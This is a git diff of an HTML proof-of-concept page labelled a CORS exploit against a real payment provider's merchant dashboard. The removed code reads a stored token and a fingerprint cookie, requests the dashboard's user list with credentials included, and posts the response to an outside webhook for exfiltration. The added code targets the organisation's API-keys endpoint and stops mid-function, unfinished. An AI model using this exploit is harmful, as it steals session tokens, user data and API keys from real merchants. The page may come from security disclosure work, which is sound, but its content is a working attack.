@@ -4,28 +4,30 @@
     <h2>💣 Rapyd CORS Exploit PoC</h2>
     
     <script>
-      console.log(localStorage.getItem('token'))
-      const headers = {
-        "Content-Type": "application/json",
-        "Token": localStorage.getItem('token'),
-        "Fingerprint": document.cookie.match(/Fingerprint=([^;]+)/)[1]
-      };
+      // Target endpoint that returns sensitive data
+        const targetUrl = 'https://dashboard.rapyd.net/v1/merchants-portal/organization/api-keys';
+        
 
-      fetch("https://dashboard.rapyd.net/v1/merchants-portal/list/users", {
-        method: "GET",
-        credentials: "include",
-        headers: headers // Correctly pass headers here
-      })
-        .then(response => response.text())
-        .then(data => {
-          // Exfiltrate to your webhook
-          fetch("https://webhook.site/57d05575-394e-4d7f-b280-b805ce1da79e", {
-            method: "POST",
-            mode: "no-cors",
-            body: data
-          });
+        
+        // Make the malicious request
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include',  // Crucial - sends cookies
+            headers: {
+                'Content-Type': 'application/json',
+                // Add any required headers here
+            }
         })
-        .catch(err => console.error("Exploit failed:", err));
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Failed to fetch data');
+            }
+            
+            // Extract headers we're interested in
+            const token = response.headers.get('token');
+            const fingerprint = response.headers.get('fingerprint');
+            
+            console.log(token)
     </script>
   </body>
 </html>
